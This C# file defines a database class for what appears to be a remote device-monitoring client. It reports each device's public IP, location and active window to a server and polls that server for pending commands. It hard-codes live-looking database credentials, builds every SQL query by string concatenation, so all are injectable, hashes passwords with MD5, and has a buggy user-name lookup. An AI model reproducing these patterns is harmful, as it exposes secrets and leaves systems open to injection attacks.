﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using MySql.Data.MySqlClient;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace Kotys
{

    class DBConnect
    {
        private MySqlConnection connection;
        private string server;
        private string database;
        private string uid;
        private string password;

        //Constructor
        public DBConnect()
        {
            Initialize();
        }
        private void Initialize()
        {
            server = "zamolxis.org";
            database = "zamolxis_kotys";
            uid = "zamolxis_api";
            password = "zamolxis2012";
            string connectionString;
            connectionString = "SERVER=" + server + ";" + "DATABASE=" + database + ";" + "UID=" + uid + ";" + "PASSWORD=" + password + ";";

            connection = new MySqlConnection(connectionString);
        }

        private bool OpenConnection()
        {
            try
            {
                connection.Open();
                return true;
            }
            catch (MySqlException ex)
            {

                //0: Cannot connect to server.
                //1045: Invalid user name and/or password.
                switch (ex.Number)
                {
                    case 0:
                        MessageBox.Show("Imposibil de conectat la baza de date");
                        break;

                    case 1045:
                        MessageBox.Show("Invalid username/password, please try again");
                        break;
                }
                return false;
            }
        }

        //Close connection
        private bool CloseConnection()
        {
            try
            {
                connection.Close();
                return true;
            }
            catch (MySqlException ex)
            {
                MessageBox.Show(ex.Message);
                return false;
            }
        }


        public int getUsersNumber(string user, string pass)
        {
            PasswordHashing pw = new PasswordHashing();
            pass = pw.CalculateMD5Hash(pass);
            string query = "SELECT COUNT(*) FROM users WHERE username = '" + user + "' AND password = '" + pass + "'";
            int Count;

            //Open Connection
            if (this.OpenConnection() == true)
            {
                //Create Mysql Command
                MySqlCommand cmd = new MySqlCommand(query, connection);

                //ExecuteScalar will return one value
                Count = int.Parse(cmd.ExecuteScalar() + "");

                //close Connection

                this.CloseConnection();

                return Count;
            }
            else
            {
                MessageBox.Show("This should never happen! / getBOOKIDCOUNT");
                return -1;
            }
        }

        public bool LogIn(string uss, string psw)
        {
            if (getUsersNumber(uss, psw) > 0)
            {
                return true;
            }
            else
            {
                return false;
            }
        }


        public string GetUserName(string username)
        {
            string query = "SELECT name FROM users WHERE username = '" + uid + "' LIMIT 1";

            //Create a list to store the result
            string name = "Default";


            //Open connection
            if (this.OpenConnection() == true)
            {
                
                MySqlCommand cmd = new MySqlCommand(query, connection);

                MySqlDataReader reader = cmd.ExecuteReader();

                while (reader.Read())
                {
                    name = reader.ToString();

                }

                this.CloseConnection();

                return name;
            }
            else
            {
                return name;
            }
        }

        public void UpdateActive(string devID, bool active)
        {
            string query = "";

           if(active == true)
           {
               query = "UPDATE devices SET active='1' WHERE id='" + devID + "'";
           }else
           {
               query = "UPDATE devices SET active='0' WHERE id='" + devID + "'";
           }

            //Open connection
            if (this.OpenConnection() == true)
            {
                //create mysql command
                MySqlCommand cmd = new MySqlCommand();
                //Assign the query using CommandText
                cmd.CommandText = query;
                //Assign the connection using Connection
                cmd.Connection = connection;

                //Execute query
                cmd.ExecuteNonQuery();

                //close connection
                this.CloseConnection();
            }
        }

        public void UpdateLastSeen(string devID)
        {
            WebClient wc = new WebClient();
            string ip = wc.DownloadString("https://api.ipify.org");
            DateTime now = DateTime.Now;
               string query = "UPDATE devices SET lastseen='"+ now +"',ip='"+ip+"' WHERE id='" + devID + "'";
               
            //Open connection
            if (this.OpenConnection() == true)
            {
                //create mysql command
                MySqlCommand cmd = new MySqlCommand();
                //Assign the query using CommandText
                cmd.CommandText = query;
                //Assign the connection using Connection
                cmd.Connection = connection;

                //Execute query
                cmd.ExecuteNonQuery();

                //close connection
                this.CloseConnection();
                
            }
        }

        public void UpdateLastLocation(string devID, string location)
        {
            
            DateTime now = DateTime.Now;
            string query = "UPDATE devices SET lastlocation='" + location + "' WHERE id='" + devID + "'";

            //Open connection
            if (this.OpenConnection() == true)
            {
                //create mysql command
                MySqlCommand cmd = new MySqlCommand();
                //Assign the query using CommandText
                cmd.CommandText = query;
                //Assign the connection using Connection
                cmd.Connection = connection;

                //Execute query
                cmd.ExecuteNonQuery();

                //close connection
                this.CloseConnection();

            }
        }

        public bool InsertReport(string devID, string info,string data, string time)
        {
            string almostdata = data.Replace('-', '/');
            string thisnewdata = almostdata.Replace('.', '/');
            //DateTime dateTime = DateTime.UtcNow.Date;
            //string data = dateTime.ToString("dd/MM/yyyy");
            //string time = DateTime.Now.ToString("h:mm:ss");
            string query = "INSERT INTO reports (id,info,date,time) VALUES ('" + devID + "','" + info + "','" + thisnewdata + "','" + time + "')";
          
            //Open connection
            if (this.OpenConnection() == true)
            {
                //create mysql command
                MySqlCommand cmd = new MySqlCommand();
                //Assign the query using CommandText
                cmd.CommandText = query;
                //Assign the connection using Connection
                cmd.Connection = connection;

                //Execute query
                cmd.ExecuteNonQuery();

                //close connection
                this.CloseConnection();
                return true;
            }
            return false;
        }

        public int getLastReportRepID(string devID)
        {
           
            
            string query = "SELECT MAX(repID) FROM reports WHERE id = '" + devID + "'";
            int Count;

            //Open Connection
            if (this.OpenConnection() == true)
            {
                //Create Mysql Command
                MySqlCommand cmd = new MySqlCommand(query, connection);

                //ExecuteScalar will return one value
                Count = int.Parse(cmd.ExecuteScalar() + "");

                //close Connection

                this.CloseConnection();

                return Count;
            }
            else
            {
                MessageBox.Show("This should never happen! / getBOOKIDCOUNT");
                return -1;
            }
        }

        public bool InsertReportInfo(string repId, string info1, string info2, string info3)
        {

            //DateTime dateTime = DateTime.UtcNow.Date;
            //string data = dateTime.ToString("dd/MM/yyyy");
            //string time = DateTime.Now.ToString("h:mm:ss");
            string query = "INSERT INTO singlereports (repId,info1,info2,info3) VALUES ('" + repId + "','" + info1 + "','" + info2 + "','" + info3 + "')";

            //Open connection
            if (this.OpenConnection() == true)
            {
                //create mysql command
                MySqlCommand cmd = new MySqlCommand();
                //Assign the query using CommandText
                cmd.CommandText = query;
                //Assign the connection using Connection
                cmd.Connection = connection;

                //Execute query
                cmd.ExecuteNonQuery();

                //close connection
                this.CloseConnection();
                return true;
            }
            return false;
        }

        public void setCommandAsDone(string identity)
        {
            string query = "UPDATE commands SET done='1' WHERE identity ='" + identity + "'";

            //Open connection
            if (this.OpenConnection() == true)
            {
                //create mysql command
                MySqlCommand cmd = new MySqlCommand();
                //Assign the query using CommandText
                cmd.CommandText = query;
                //Assign the connection using Connection
                cmd.Connection = connection;

                //Execute query
                cmd.ExecuteNonQuery();

                //close connection
                this.CloseConnection();
            }
        }

        public string getToDoCommand(string devIDs)
        {

            string query = "SELECT cmd,identity FROM commands WHERE id = '" + devIDs + "' AND done = '0' LIMIT 1";

            //Create a list to store the result
            string name = "";

            //Open connection
            if (this.OpenConnection() == true)
            {

                MySqlCommand cmd = new MySqlCommand(query, connection);

                MySqlDataReader reader = cmd.ExecuteReader();

                while (reader.Read())
                {
                    name = reader.GetString(0) + "~" + reader.GetString(1);
                }

                this.CloseConnection();

                return name;
            }
            else
            {
                return name;
            }
        }

        public void updateActiveWindow(string devIDs,string info)
        {
            string query = "UPDATE devices SET activewindow='"+info+"' WHERE id ='" + devIDs + "'";

            //Open connection
            if (this.OpenConnection() == true)
            {
                //create mysql command
                MySqlCommand cmd = new MySqlCommand();
                //Assign the query using CommandText
                cmd.CommandText = query;
                //Assign the connection using Connection
                cmd.Connection = connection;

                //Execute query
                cmd.ExecuteNonQuery();

                //close connection
                this.CloseConnection();
            }
        }

    }
    }
